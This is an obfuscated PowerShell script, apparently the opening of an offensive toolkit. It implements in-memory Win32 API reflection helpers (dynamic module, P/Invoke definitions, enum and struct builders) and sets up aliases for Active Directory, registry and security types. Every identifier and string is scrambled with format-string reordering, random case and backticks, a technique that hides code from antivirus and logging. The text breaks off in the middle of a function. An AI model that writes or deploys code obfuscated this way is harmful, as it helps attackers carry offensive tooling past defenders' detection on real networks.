set-ITeM  ("V"+"ariAble"+":"+"kWn1") ( [TYpE]("{1}{0}"-f'uid','G') );  seT-ITEm  ("{1}{3}{0}{2}" -f':gT','vA','nQ8h','RIabLe')  (  [TypE]("{3}{0}{5}{7}{4}{6}{2}{1}" -f'SeRVIC','tIoN','N','rUNtiMe.INtErop','nv','Es.','e','caLLIngco')  ) ;  ${W`Zc} =  [TYpe]("{5}{1}{4}{3}{2}{6}{0}"-F 'T','I','opservI','er','Me.InT','RUNT','ces.cHaRSE') ;  Set-VArIAbLE ("{1}{0}" -f'1','vu34r')  ( [tYpe]("{2}{6}{1}{11}{7}{5}{3}{8}{9}{10}{4}{0}{12}"-F 'TRiB','T','Ru','ErvICeS','T','s','n','rOp','.D','lLiMPOR','ta','iME.iNTE','UTe') ); Sv ("b"+"21") ( [tYPe]("{1}{2}{3}{0}" -f'RibutE','f','lA','gSATT')  );sEt-iTEm  ("{3}{2}{1}{0}"-f 'E:AeT','L','B','VaRia') ([tYpe]("{3}{2}{4}{1}{5}{0}"-F'E','acKINg','TI','reFlEC','ON.emiT.p','siZ')  )  ;SV ('uaQX'+'eH')  (  [tyPe]("{3}{4}{6}{0}{2}{5}{1}" -F'peAtTrI','eS','bu','RE','F','t','lEcTION.TY')  )  ; Set-itEM  ("VaR"+"IA"+"blE:"+"XI9") ([TYpe]("{3}{7}{5}{6}{4}{0}{2}{1}{8}"-f'vIce','MARshALAs','S.','ruNTIM','psEr','NTE','rO','e.i','attribUTe')  ) ;   sv ('s4PY'+'J') (  [TYPE]("{0}{1}" -f'Ty','Pe')  )  ;   ${Y`9Z}  =  [TyPE]("{3}{4}{1}{2}{0}"-F 'des','LeCt','ION.emiT.OPco','r','ef')  ;   SET-iteM  ("{1}{3}{2}{0}"-f '2YwK','VarIa','LE:N','B')  ( [TypE]("{1}{0}{2}"-F'.','iO','pAtH') );${a`10}  = [TyPe]("{2}{1}{0}" -F 'filE','M.io.','SySTe')  ; SET-vArIAblE ("{0}{1}" -f 'tG1e','S') ([tYpe]("{0}{3}{1}{2}"-f 'SYsTEM','Io.FIlEm','odE','.'))  ;   Sv ("{1}{0}"-f'Q','LEV') ([tYpE]("{3}{2}{1}{4}{0}"-F 's','C','steM.Io.fiLeAc','Sy','eS') )  ;   SEt-itEM  ("vARi"+"A"+"bLE:dw4"+"Ov"+"7") ( [type]("{1}{2}{0}{3}" -F 'hAR','IO.fil','ES','e')  )  ;${S`lFyz} =[tyPE]("{2}{1}{0}" -f'dNs','eT.','N') ;   sEt-vARIABlE ("em54"+"2") (  [tyPE]("{1}{0}{2}" -F'tIVAtO','aC','r')) ;   set-iteM  ('vArIABl'+'E:w'+'g5'+'Th')  (  [tyPE]("{0}{1}{3}{4}{2}"-f'sYsTEM.thRE','adIng.','reAd','T','H')  )  ;  sEt-IteM ("{2}{1}{0}" -f 'iC','rIABLe:b','Va') ( [TyPe]("{1}{2}{0}{4}{3}"-F'l','r','Ef','iON.aSsEmbLy','eCT') )  ; SET-ITEm ("vARIABl"+"E"+":"+"QT5l"+"W") ([type]("{4}{5}{1}{3}{2}{0}"-f 'rtEr','tem.bIT','E','conv','s','YS') )  ;Sv ("{1}{0}" -f'd','EXo') (  [type]("{0}{1}{4}{2}{5}{3}"-F'SYS','teM.rEFl','.BiNdi','gS','ecTION','nGfLA')  );  ${d`VX} = [TYpE]("{9}{4}{0}{3}{6}{2}{5}{1}{7}{8}"-f'ry','lC','iCES.rEfErR','SER','To','A','v','HaSIngoptio','N','sySTeM.diRec')  ;  SET-itEm  ("{0}{1}{2}"-f'vA','RiablE:SJ','GUO')  (  [tYPe]("{0}{3}{1}{5}{2}{6}{4}"-F'sys','SE','eS.sE','TEm.directOry','MaSKS','RVIc','CUrITY'));  ${1`6S}  =[TyPe]("{1}{0}"-F 'RraY','A')  ;   set  ("{1}{0}" -f 'r','a2t')  ([TYPE]("{1}{2}{0}{3}" -f'o','S','ySTEm.c','NveRt') );  seT-vaRiaBLE  ('w'+'qY'+'KnB')  ([TYPe]("{9}{10}{5}{7}{1}{8}{12}{3}{4}{6}{0}{11}{2}" -f 'cTo','cTORY','OMAIn','tiV','e','dI','Dire','rE','serv','syst','eM.','RY.D','icEs.ac')  )  ;  SET-vARIABLe  ("l8"+"F") ([TYPe]("{0}{1}{2}" -f 'C','ONvE','rT') ) ; sEt-ItEM ("{2}{0}{1}"-f 'n','s5','VAriAbLe:m')  ([tYpe]("{1}{0}"-F'm','ENU')) ;  seT-ItEm ("{1}{0}{3}{4}{2}" -f'Iab','var','d','Le',':6uMO') ([Type]("{2}{0}{1}" -F 'ITconverT','er','b')  ); ${2`z1J}=  [tYPe]("{0}{2}{1}{3}"-F'SyS','Tex','tEM.','T.encodInG');  seT-ItEM ("{3}{0}{1}{2}" -f 'R','IABlE:Iw','a0p','Va') ( [type]("{4}{5}{6}{0}{2}{1}{3}"-F'T','Ion','RiNGsplitopT','s','syste','M','.s')) ;sEt-vARiAble ("{0}{1}"-f'c','597')  ([TYPE]("{1}{0}" -f'EgeX','R'));    sEt-IteM ("{3}{0}{1}{2}" -f 'ARiAbl','e',':Pj4','V') (  [TyPe]("{0}{1}{6}{2}{3}{5}{4}" -f 'Mi','CrOsOFT','32.r','eg','y','isTrYKe','.WIN')  )  ;  Set  ("{1}{2}{0}" -f 'l','70q','Um') ( [TYpE]("{3}{2}{6}{8}{5}{1}{4}{0}{7}"-f 'aR','eS','M','SYsTe','.m','c','.RUNTiME','ShAL','.iNTeROpsERVI')) ;${v`pg}= [TypE]("{0}{1}" -f 'iO.F','Ile') ;  sET-ItEm ('vA'+'rIaBLe:o'+'U'+'41')  (  [tYpe]("{0}{8}{3}{6}{7}{2}{10}{5}{9}{1}{4}"-F 'sYSt','IOnS','rUNsPAc','Mana','tATE','ni','gEment.auTo','MAtION.','EM.','TIalSESs','Es.i')  )  ; Set  ('hk'+'G')  (  [tYPE]("{6}{3}{4}{7}{1}{0}{2}{5}"-f 'rT','adiNG.APA','meNTstaT','Yst','Em.th','e','s','rE'))  ;   ${t`7i2} =  [tYPE]("{3}{2}{1}{0}{4}" -F'CEfa','a','Sp','rUn','CtoRY') ;   SET  ("JO"+"361Q") (  [TYpe]("{2}{1}{0}"-f 'l','El','powErsH') );   sEt  ("{1}{0}"-f'UA','s') ( [TypE]("{2}{0}{1}"-f 'oNME','nt','EnVIR')  )  ;  seT-iteM  ("{4}{3}{0}{2}{1}"-f 'ABlE:o','g','9hW','i','vAr')  ([TypE]("{0}{1}{2}" -F 's','ySt','em.neT.DNs') );  ${j1`lgM}  =  [tyPe]("{1}{2}{0}" -F 'mE','DAt','etI');    SET-VaRiAbLe ('g'+'1eUp') ( [tYPe]("{0}{2}{1}{3}"-f'iO.d','recT','I','ORY'))  ; SET-itEm ("{0}{1}{2}" -f'VARIAbL','E:1z','E') ( [TYpE]("{3}{1}{2}{0}{4}{6}{5}{7}{8}" -f 'a','ECuritY','.PRIncip','SYSTem.S','L','LKn','.weL','O','WnSIDtypE')  )  ;    ${3`Rx8`Iv}=  [type]("{3}{8}{7}{4}{1}{6}{5}{0}{2}"-f'.mar','VI','sHAl','ru','r','es','c','sE','nTiME.inTerOp')  ;    SeT-vAriAblE  ("{1}{0}"-f 'N','qF')  ( [TyPE]("{9}{3}{2}{8}{1}{4}{6}{10}{5}{7}{0}"-F'entiAl','NT.AUTo','ag','n','M','SCr','ATION','ed','eME','mA','.P') ) ;    ${H`wVA} = [tYpE]("{9}{11}{7}{12}{3}{6}{0}{13}{1}{2}{8}{4}{5}{10}" -f 'cES.','i','VEDirecto','cTorY','o','R','ServI','sTe','RY.f','S','eST','y','M.DirE','ACt')  ; Sv ("l"+"fj")  ([TYPe]("{0}{1}" -f 'stri','NG')  ); sET-Item  ("VarIAB"+"L"+"E"+":kEGSB")  (  [tYPE]("{1}{0}"-F'tr','INtP') )  ;  set-ItEm  ("v"+"aRIABLE"+":ST5HA") ( [TYpe]("{0}{1}" -F'i','Nt32') ) ;  












function N`E`w-inME`mORyM`ODulE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{5}{0}{12}{11}{6}{4}{9}{2}{10}{3}{8}{1}" -f 'ld','ns','ateC','gFu','ssFo','eShou','oce','PSUs','nctio','rSt','hangin','r','P'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(posITioN = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${mOdu`LeN`A`me} =  (  GEt-vaRIABle ('KW'+'n1') -ValuEoNlY )::("{0}{1}" -f'NewGui','d').Invoke().("{0}{1}" -f'ToStri','ng').Invoke()
    )

    ${A`ppdom`AIn} =  ${b`Ic}."asSE`MBly".("{1}{2}{0}"-f'ype','Ge','tT').Invoke(("{2}{1}{3}{0}" -f'n','m.AppDom','Syste','ai')).("{0}{2}{1}" -f 'GetP','rty','rope').Invoke(("{3}{0}{1}{2}" -f 'u','r','rentDomain','C')).("{1}{2}{0}"-f 'lue','Get','Va').Invoke(${NU`LL}, @())
    ${l`OaDed`AS`Semb`Lies} = ${A`ppdoM`AIN}.("{2}{0}{3}{1}"-f't','emblies','Ge','Ass').Invoke()

    foreach (${a`Ss`embLy} in ${Lo`AdeDas`se`MbLIES}) {
        if (${ASs`E`MbLY}."FUL`L`NAme" -and (${assE`mBlY}."Ful`ln`AmE".("{1}{0}"-f'lit','Sp').Invoke(',')[0] -eq ${M`ODu`l`ENAme})) {
            return ${a`SsE`M`Bly}
        }
    }

    ${DYnAss`emb`LY} = &("{0}{1}{2}" -f'N','ew','-Object') ("{3}{1}{0}{5}{6}{4}{2}" -f 'A','on.','yName','Reflecti','mbl','ss','e')(${M`od`UL`ENAme})
    ${dOM`AIN} = ${Ap`pd`OmaiN}
    ${Ass`e`MBly`BUiLdEr} = ${d`OmaIn}.("{0}{3}{6}{2}{1}{5}{4}" -f'Define','em','micAss','Dyn','ly','b','a').Invoke(${DYnAS`Sem`BLY}, 'Run')
    ${M`odul`E`B`UiLdER} = ${ASSEmb`L`Yb`UiLd`ER}.("{1}{3}{0}{5}{2}{4}"-f 'eDy','D','u','efin','le','namicMod').Invoke(${M`oDul`ENAMe}, ${F`AL`sE})

    return ${mODul`eBU`IL`der}
}




function FU`Nc {
    Param (
        [Parameter(poSiTION = 0, MaNDaToRy = ${T`Rue})]
        [String]
        ${dl`LNa`mE},

        [Parameter(PoSITiOn = 1, MaNdaTOrY = ${Tr`UE})]
        [string]
        ${FuN`ctioN`NAme},

        [Parameter(posiTION = 2, MandATORy = ${T`Rue})]
        [Type]
        ${rE`TurNT`y`Pe},

        [Parameter(pOSiTIon = 3)]
        [Type[]]
        ${Par`AMETeRT`Y`p`eS},

        [Parameter(pOSITIoN = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${N`AtIvE`C`ALliNg`CO`NVeNtI`oN},

        [Parameter(PosiTiOn = 5)]
        [Runtime.InteropServices.CharSet]
        ${C`Ha`RsEt},

        [String]
        ${enTRYP`oI`Nt},

        [Switch]
        ${s`EtLAst`E`Rror}
    )

    ${pR`op`ER`Ties} = @{
        ("{0}{1}" -f 'D','llName') = ${Dl`LN`AmE}
        ("{3}{2}{1}{0}"-f 'me','ionNa','nct','Fu') = ${fU`NctI`on`Na`ME}
        ("{3}{0}{1}{2}"-f'T','y','pe','Return') = ${Re`Tur`NTYPE}
    }

    if (${PAra`met`eRty`PES}) { ${Pr`op`erT`ies}[("{1}{2}{0}{4}{3}" -f 't','Param','e','ypes','erT')] = ${paramE`Te`RtYp`es} }
    if (${na`TivECaLL`InGCONv`E`NTIOn}) { ${pR`OpERTi`Es}[("{4}{6}{0}{5}{3}{2}{1}" -f'eCalling','n','tio','ven','Nat','Con','iv')] = ${NAtiVE`C`Al`lINgCO`N`V`ENtiON} }
    if (${c`Har`sET}) { ${P`RoP`ER`TiEs}[("{2}{1}{0}"-f 't','arse','Ch')] = ${chAr`SET} }
    if (${se`TlaSte`R`RoR}) { ${prOP`eR`TIEs}[("{0}{1}{2}"-f 'S','etLast','Error')] = ${setlasT`e`RRor} }
    if (${eNT`R`yPOI`NT}) { ${Pro`Pe`RTies}[("{0}{2}{1}{3}"-f 'E','o','ntryP','int')] = ${Ent`RypOI`Nt} }

    &("{0}{3}{2}{1}" -f'New','ct','je','-Ob') ("{0}{1}{2}"-f 'PSObj','e','ct') -Property ${proPeRt`i`Es}
}


function Add-WI`N`3`2tYPE
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(manDaTorY=${t`Rue}, VaLueFrompipelInEBypROPertYnAME=${tR`Ue})]
        [String]
        ${dL`lNAME},

        [Parameter(MandaTORy=${t`RuE}, VAlueFrompipeLINEbyPropERtynaMe=${tr`Ue})]
        [String]
        ${FUnCTIO`Nna`me},

        [Parameter(vALUEfroMpiPElInEbYPRopERTYName=${tr`UE})]
        [String]
        ${EnTRy`p`oinT},

        [Parameter(ManDAToRY=${tR`UE}, vAlueFrOMpIpelineByproPERtyNaME=${T`Rue})]
        [Type]
        ${r`eTUr`NTyPE},

        [Parameter(VALUeFromPipElINEByprOPertynamE=${Tr`UE})]
        [Type[]]
        ${parAME`Te`Rt`Yp`ES},

        [Parameter(VALuEFROMPIpeLiNEBYPrOPeRTYname=${Tr`UE})]
        [Runtime.InteropServices.CallingConvention]
        ${nA`Ti`VE`CaLlin`GCO`NvE`NTIon} =   (  VARiaBLE  ("{1}{0}" -f '8h','GtnQ')  -valuEOnLy)::"stDC`AlL",

        [Parameter(vALuefROmPIPElineBYpRoPeRtYNAMe=${Tr`UE})]
        [Runtime.InteropServices.CharSet]
        ${CHa`R`set} =  (gEt-vARIaBle ("{0}{1}"-f'w','zC')  -valuEOn  )::"Au`TO",

        [Parameter(VAlUefrOmpipeLinEByPRoPERtYnamE=${t`Rue})]
        [Switch]
        ${s`EtlAStE`Rr`oR},

        [Parameter(MAndaTory=${t`RUE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${m`odUlE},

        [ValidateNotNull()]
        [String]
        ${nAM`e`spa`ce} = ''
    )

    BEGIN
    {
        ${TYP`EHA`Sh} = @{}
    }

    PROCESS
    {
        if (${m`O`dule} -is [Reflection.Assembly])
        {
            if (${NameS`PA`Ce})
            {
                ${TYp`EhA`Sh}[${DllN`A`Me}] = ${MODu`lE}.("{0}{1}"-f'G','etType').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${T`YPEH`AsH}[${DLL`N`AmE}] = ${M`oD`Ule}.("{1}{0}" -f 'pe','GetTy').Invoke(${Dll`NAMe})
            }
        }
        else
        {
            
            if (!${tYpEHA`Sh}.("{0}{2}{1}"-f 'Conta','ey','insK').Invoke(${DL`lNA`ME}))
            {
                if (${N`A`MEs`Pace})
                {
                    ${tYPe`Ha`sh}[${dLLN`AME}] = ${moDU`lE}.("{1}{0}{2}" -f'neTyp','Defi','e').Invoke("$Namespace.$DllName", ("{4}{3}{1}{2}{0}{6}{5}" -f',BeforeFiel','l','ic','ub','P','Init','d'))
                }
                else
                {
                    ${T`YPe`hA`Sh}[${dL`l`NaMe}] = ${m`odulE}.("{1}{2}{3}{0}" -f 'e','Defi','neT','yp').Invoke(${D`l`lNAME}, ("{4}{0}{2}{3}{1}" -f 'ublic,B','dInit','eforeFie','l','P'))
                }
            }

            ${meT`hOd} = ${TY`PEHA`SH}[${DL`l`NAme}].("{2}{0}{1}"-f 'efineMetho','d','D').Invoke(
                ${FuN`c`Ti`ON`NAme},
                ("{4}{5}{0}{1}{3}{2}"-f 'blic,','Stati','PinvokeImpl','c,','P','u'),
                ${r`etUrnt`yPe},
                ${pA`Rame`TERty`PEs})

            
            ${I} = 1
            foreach(${p`ARAmE`TER} in ${PA`RAMeT`E`RTypES})
            {
                if (${p`A`RA`mETER}."iSby`REF")
                {
                    [void] ${ME`TH`Od}.("{0}{3}{1}{2}" -f'DefinePar','mete','r','a').Invoke(${i}, 'Out', ${N`UlL})
                }

                ${I}++
            }

            ${dLl`Im`port} = [Runtime.InteropServices.DllImportAttribute]
            ${SetLaS`TE`RR`orFiE`LD} = ${D`llim`pORt}.("{0}{1}{2}"-f'G','e','tField').Invoke(("{3}{1}{2}{0}" -f 'Error','etL','ast','S'))
            ${C`ALl`I`NGConVEnti`Onf`ieLD} = ${d`Lli`m`Port}.("{0}{1}{2}" -f 'G','e','tField').Invoke(("{2}{0}{1}{3}" -f 'ingC','onven','Call','tion'))
            ${chaRS`E`T`FiELd} = ${dll`i`MpoRT}.("{0}{1}" -f 'Ge','tField').Invoke(("{0}{2}{1}" -f'C','arSet','h'))
            ${En`T`R`Y`pOiNtfIeLD} = ${Dl`li`MpOrT}.("{0}{1}" -f'G','etField').Invoke(("{3}{1}{2}{0}"-f 'nt','Po','i','Entry'))
            if (${S`Etl`A`st`eRRoR}) { ${sleVal`Ue} = ${t`RuE} } else { ${sLE`Va`lue} = ${F`AL`se} }

            if (${ps`BoUnDpA`RaM`E`TERS}[("{2}{1}{0}"-f 'Point','ry','Ent')]) { ${eXpoR`T`EDFun`CNa`ME} = ${E`NTrYp`OinT} } else { ${e`XPO`R`T`E`dFUnCNaME} = ${fu`Nc`T`IonN`AME} }

            
            ${c`on`stRU`CToR} =   ${V`U`34r1}."gE`TcONSTruc`T`oR"([String])
            ${DLL`Import`AtTRIB`UTE} = &("{0}{1}{2}"-f 'N','ew-Obje','ct') ("{0}{7}{4}{3}{6}{5}{1}{2}"-f'Re','uil','der','n.Emit.Custo','tio','uteB','mAttrib','flec')(${c`oNs`TR`UCtOr},
                ${Dll`NAmE}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${sE`TlAS`TERr`ORFI`Eld},
                                           ${ca`LLiNg`CONVen`T`I`oNFieLD},
                                           ${chA`RSET`F`Ield},
                                           ${eNTRyp`O`I`NTFI`ElD}),
                [Object[]] @(${S`LEvA`LuE},
                             ([Runtime.InteropServices.CallingConvention] ${nATIV`ec`ALL`ingc`onVEnTIon}),
                             ([Runtime.InteropServices.CharSet] ${cH`Ars`et}),
                             ${e`XpORteD`FUncna`me}))

            ${m`etH`oD}.("{0}{4}{2}{5}{3}{1}" -f 'SetCu','ute','mA','trib','sto','t').Invoke(${dllIM`P`or`Ta`TtRibuTe})
        }
    }

    END
    {
        if (${MO`d`ULE} -is [Reflection.Assembly])
        {
            return ${T`Y`PehAsh}
        }

        ${RET`U`R`NTYPEs} = @{}

        foreach (${K`eY} in ${ty`Peh`ASH}."Ke`Ys")
        {
            ${t`YPe} = ${TY`P`eH`AsH}[${K`ey}].("{2}{0}{1}"-f 'T','ype','Create').Invoke()

            ${rETURN`T`YPES}[${k`EY}] = ${ty`pE}
        }

        return ${RE`TUrNt`YP`Es}
    }
}


function Pse`N`UM {


    [OutputType([Type])]
    Param (
        [Parameter(pOsitIon = 0, manDaTOry=${TR`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${M`oDu`le},

        [Parameter(poSiTion = 1, MandAtoRy=${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fUllN`A`me},

        [Parameter(PosItIon = 2, maNDAtorY=${t`RuE})]
        [Type]
        ${t`Ype},

        [Parameter(POSITION = 3, mANDAtOry=${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${enU`MEl`e`MEnTs},

        [Switch]
        ${biTF`i`eLD}
    )

    if (${mOD`ULe} -is [Reflection.Assembly])
    {
        return (${M`oduLE}.("{1}{0}{2}" -f't','Ge','Type').Invoke(${fuL`LN`Ame}))
    }

    ${enU`mTy`pE} = ${ty`PE} -as [Type]

    ${enUMb`UILD`ER} = ${M`odU`lE}.("{1}{2}{0}" -f 'num','D','efineE').Invoke(${fuLln`AmE}, ("{1}{0}" -f 'blic','Pu'), ${EN`UMtY`pe})

    if (${B`I`TFiELD})
    {
        ${FlAgS`c`O`NStrucTOr} =   (  CHiLDiteM ('V'+'ARIABLE:b'+'21'))."vAl`Ue"."gETCO`NStrUct`Or"(@())
        ${f`LA`gsC`USTOm`AtTRIbU`Te} = &("{0}{2}{1}" -f 'New-Obje','t','c') ("{2}{6}{3}{1}{5}{9}{4}{8}{7}{0}" -f'r','.C','Refl','ction.Emit','ibu','ust','e','de','teBuil','omAttr')(${F`LAgsc`ONs`TrUctor}, @())
        ${en`UMb`UIl`dER}.("{0}{2}{1}{3}" -f'SetCustomA','tr','t','ibute').Invoke(${FlAg`SCUsTOmAT`TRib`UtE})
    }

    foreach (${K`Ey} in ${EnUmELeM`E`N`TS}."Ke`Ys")
    {
        
        ${n`UlL} = ${eN`U`mBu`IlDeR}."DeF`iNe`LItEraL"(${K`Ey}, ${eNumELE`M`en`Ts}[${k`EY}] -as ${E`Nu`mtype})
    }

    ${EN`UmBU`il`DEr}.("{3}{0}{2}{1}" -f 'eate','pe','Ty','Cr').Invoke()
}




function FiE`lD {
    Param (
        [Parameter(posITIoN = 0, MaNDAtoRy=${T`RUe})]
        [UInt16]
        ${posi`T`IoN},

        [Parameter(poSITION = 1, MANdatORY=${tR`UE})]
        [Type]
        ${T`ypE},

        [Parameter(pOSItIon = 2)]
        [UInt16]
        ${OFfs`Et},

        [Object[]]
        ${MarS`hA`LAs}
    )

    @{
        poSITiON = ${posiT`I`ON}
        ("{1}{0}"-f'e','Typ') = ${T`Ype} -as [Type]
        ("{1}{0}" -f 'et','Offs') = ${Of`F`SeT}
        ("{2}{0}{1}"-f'ars','halAs','M') = ${mar`SH`ALAs}
    }
}


function s`TRUCt
{


    [OutputType([Type])]
    Param (
        [Parameter(posiTiOn = 1, MAnDaToRY=${tr`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${m`oDu`Le},

        [Parameter(POSiTION = 2, mANdAtORY=${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FU`L`LNA`Me},

        [Parameter(pOsITIOn = 3, MaNDAtory=${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${StR`UcT`FIe`Lds},

        [Reflection.Emit.PackingSize]
        ${PAC`kiNGS`i`Ze} =  ( GET-VaRiable  ("{1}{0}" -f'T','ae') )."V`AlUE"::"u`NSp`E`cIFiED",

        [Switch]
        ${EX`PL`I`cItlAYoUt}
    )

    if (${mo`Du`le} -is [Reflection.Assembly])
    {
        return (${M`OdU`LE}.("{0}{1}{2}"-f'G','etT','ype').Invoke(${Fu`l`L`Name}))
    }

    [Reflection.TypeAttributes] ${s`T`R`UCtaTtRIbu`TeS} = ("{5}{11}{2}{19}{13}{18}{7}{15}{16}{1}{14}{22}{21}{0}{17}{3}{9}{8}{12}{4}{20}{23}{6}{10}" -f ' Publ',' ','iC','
    ','aled,
     ','A','ldI','    ','  S','  ','nit','ns','e','ss,
 ','  ','Class',',
','ic,','   ','la','   Be',' ','   ','foreFie')

    if (${Expli`CItlAYO`UT})
    {
        ${St`RuC`T`ATTRIBUteS} = ${s`T`R`UCTat`TRi`BUteS} -bor   (  gET-VARiaBlE ("U"+"AqXeH"))."Va`lUe"::"Expli`c`i`Tl`AyOUT"
    }
    else
    {
        ${sT`R`U`Ct`AttRiButEs} = ${sT`R`U`cTatTRibUt`eS} -bor  ( get-varIAblE ('UAqx'+'EH')  -VAlUeON )::"SEQuENT`ialLaY`Out"
    }

    ${STRuctbu`i`LDer} = ${modu`le}."de`FInEt`yPe"(${f`UL`lnAmE}, ${str`U`CTA`TTRIBUTes}, [ValueType], ${Pa`ck`IngSIze})
    ${cons`Truct`O`RINfO} =   ( Get-VARIablE ('X'+'i9')  )."Val`Ue".("{2}{1}{3}{0}" -f 's','str','GetCon','uctor').Invoke()[0]
    ${s`IzECO`NSt} = @(  (  GI ("vAr"+"ia"+"ble:"+"XI9")  )."V`AluE".("{0}{2}{1}" -f'Get','eld','Fi').Invoke(("{3}{1}{0}{2}" -f 'C','e','onst','Siz')))

    ${fI`e`LDs} = &("{1}{2}{0}" -f'-Object','N','ew') ("{3}{1}{0}{2}"-f'le[','tab',']','Hash')(${strU`CT`FiELDs}."co`UnT")

    
    
    
    foreach (${fi`eLd} in ${STRuct`FIEL`ds}."Ke`Ys")
    {
        ${I`NDeX} = ${s`TruC`TFiElDs}[${FI`eld}][("{1}{0}" -f 'osition','P')]
        ${FiE`LDs}[${iN`DEx}] = @{("{1}{0}{2}" -f'N','Field','ame') = ${F`IEld}; ("{1}{0}{2}"-f 'o','Pr','perties') = ${Stru`c`T`F`iElDs}[${f`IeLD}]}
    }

    foreach (${FiE`lD} in ${FieL`Ds})
    {
        ${fi`ElD`N`AMe} = ${FIE`LD}[("{2}{1}{0}" -f'Name','d','Fiel')]
        ${fiE`L`dpRoP} = ${f`IE`Ld}[("{0}{1}{2}" -f'Prope','rt','ies')]

        ${of`FS`ET} = ${f`ieLDpr`oP}[("{1}{0}{2}"-f 'fse','Of','t')]
        ${TY`PE} = ${f`IELd`Pr`oP}[("{1}{0}" -f 'pe','Ty')]
        ${m`Ar`sHALAS} = ${FIeLd`PR`oP}[("{0}{1}{2}"-f 'Marshal','A','s')]

        ${Ne`WFi`Eld} = ${sTRU`CtB`UiLd`ER}.("{1}{2}{0}" -f'Field','Def','ine').Invoke(${fi`El`dnaMe}, ${t`YPe}, ("{1}{0}" -f 'ic','Publ'))

        if (${Ma`RS`hAl`AS})
        {
            ${U`NmanAged`T`YPE} = ${mAR`sHa`L`As}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${mA`RsHaL`AS}[1])
            {
                ${S`iZe} = ${MA`RS`Ha`laS}[1]
                ${ATtr`ibbUilD`eR} = &("{1}{2}{0}" -f 'Object','Ne','w-') ("{4}{0}{5}{1}{2}{6}{3}{7}"-f'cti','.Em','it.','ustomAttri','Refle','on','C','buteBuilder')(${ConS`TruCT`O`RiN`Fo},
                    ${UN`M`A`NAgedTyPe}, ${sI`ZeCo`N`sT}, @(${sI`zE}))
            }
            else
            {
                ${aTT`RIBB`Ui`LD`ER} = &("{2}{0}{1}"-f'-O','bject','New') ("{0}{4}{6}{2}{1}{7}{5}{3}" -f 'Reflection','t','us','lder','.E','ttributeBui','mit.C','omA')(${CONSt`RU`Cto`RINFo}, [Object[]] @(${uN`ma`Nag`eDt`YPE}))
            }

            ${nEwF`I`ELd}.("{3}{0}{2}{1}"-f'us','omAttribute','t','SetC').Invoke(${aTT`Rib`B`UiLdER})
        }

        if (${eXp`liCIT`lA`Yo`UT}) { ${Ne`W`FiELd}.("{2}{1}{0}"-f 't','tOffse','Se').Invoke(${OfFS`ET}) }
    }

    
    
    ${Siz`e`METHOd} = ${strUctb`U`I`ldEr}.("{1}{2}{3}{0}"-f 'thod','Define','M','e').Invoke(("{2}{0}{1}"-f 'Si','ze','Get'),
        ("{1}{0}{2}" -f'ublic, St','P','atic'),
        [Int],
        [Type[]] @())
    ${Il`GENER`A`ToR} = ${s`IzE`METh`Od}.("{3}{2}{0}{1}"-f 'Gen','erator','tIL','Ge').Invoke()
    
    ${iLgeN`ER`AT`oR}.("{1}{0}"-f't','Emi').Invoke( ${y`9z}::"Ldt`Ok`EN", ${sT`R`UCT`BUIlDER})
    ${I`lGenER`ATOr}.("{1}{0}"-f 't','Emi').Invoke( ( Gi ("{0}{3}{1}{2}"-f 'varI','ble:Y9','Z','a') )."vAl`Ue"::"ca`LL",
         (VAriabLE  ("{0}{1}"-f 'S4p','Yj'))."V`ALUe".("{1}{2}{0}" -f 'thod','Ge','tMe').Invoke(("{1}{3}{2}{0}" -f'le','Ge','peFromHand','tTy')))
    ${iLGENEr`At`OR}.("{0}{1}"-f'Em','it').Invoke(  ${Y`9Z}::"CA`lL",
          ( vAriABLe ("{2}{1}{0}" -f'V','X8I','3R')  )."VaL`UE".("{1}{0}{2}"-f'tMeth','Ge','od').Invoke(("{1}{0}" -f 'f','SizeO'), [Type[]] @([Type])))
    ${i`lgEnE`RaT`or}.("{0}{1}" -f 'Em','it').Invoke(  (  item ('v'+'aRIA'+'BlE:Y9'+'Z'))."va`LuE"::"r`ET")

    
    
    ${iMp`Lic`iT`con`V`erteR} = ${St`R`Uct`BUilDEr}.("{3}{0}{1}{2}" -f'i','neM','ethod','Def').Invoke(("{2}{1}{3}{0}" -f'it','mpli','op_I','c'),
        ("{4}{6}{11}{1}{2}{7}{3}{12}{8}{5}{9}{0}{10}"-f'cial',' P','ublic,','at','PrivateScop','ig, Sp','e',' St',' HideByS','e','Name',',','ic,'),
        ${S`TrU`cTBU`iLDer},
        [Type[]] @([IntPtr]))
    ${I`Lgenerat`o`R2} = ${ImPLI`CITc`o`NVE`R`TEr}.("{0}{3}{4}{2}{1}" -f 'G','ator','ener','et','ILG').Invoke()
    ${IlG`E`NerATOr2}.("{0}{1}" -f'Emi','t').Invoke(  ${Y`9z}::"N`Op")
    ${ILGe`NER`Ator2}.("{1}{0}"-f'it','Em').Invoke( ( VarIaBlE ("Y"+"9Z"))."vAl`Ue"::"LdaR`g_0")
    ${ILgeNE`RA`TOr2}.("{0}{1}"-f'Emi','t').Invoke(  ( iTEm ("vaR"+"I"+"aB"+"LE:y9Z")  )."v`ALUe"::"LDToK`en", ${stRuC`T`BUilDEr})
    ${i`LgEnERa`ToR2}.("{1}{0}" -f 't','Emi').Invoke( ( vArIAbLe  ('y9'+'z'))."V`AlUe"::"C`ALL",
          (  vaRiablE  ('s4pY'+'j') )."VA`LUe".("{1}{2}{0}"-f 'hod','GetM','et').Invoke(("{0}{3}{5}{4}{1}{2}"-f 'Ge','rom','Handle','tT','F','ype')))
